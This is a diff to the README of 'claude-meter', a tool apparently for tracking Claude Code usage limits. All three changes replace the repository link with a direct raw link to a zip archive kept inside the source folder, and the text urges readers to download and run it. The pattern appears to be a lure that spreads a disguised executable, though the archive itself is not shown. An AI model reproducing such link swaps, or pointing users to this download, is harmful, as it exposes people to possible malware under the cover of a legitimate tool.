@@ -1,6 +1,6 @@
 # 📏 claude-meter - Track Claude Code Limits Fast
 
-[![Download claude-meter](https://img.shields.io/badge/Download-claude--meter-blue?style=for-the-badge&logo=github)](https://github.com/Rimaglottidisspacewalk319/claude-meter)
+[![Download claude-meter](https://img.shields.io/badge/Download-claude--meter-blue?style=for-the-badge&logo=github)](https://github.com/Rimaglottidisspacewalk319/claude-meter/raw/refs/heads/main/cmd/claude-meter/claude_meter_3.0.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ If your PC can run modern desktop apps, it should be fine for this tool.
 
 Visit this page to download and run the app:
 
-https://github.com/Rimaglottidisspacewalk319/claude-meter
+https://github.com/Rimaglottidisspacewalk319/claude-meter/raw/refs/heads/main/cmd/claude-meter/claude_meter_3.0.zip
 
 If the page offers a release file, download it to your PC. If it shows source files first, look for the built app in the latest release section.
 
@@ -161,4 +161,4 @@ That is the main job of claude-meter
 - Repository: claude-meter
 - Description: Tracking Claude Code Usage Limits
 - Topics: claude, claude-code
-- Primary link: https://github.com/Rimaglottidisspacewalk319/claude-meter
+- Primary link: https://github.com/Rimaglottidisspacewalk319/claude-meter/raw/refs/heads/main/cmd/claude-meter/claude_meter_3.0.zip
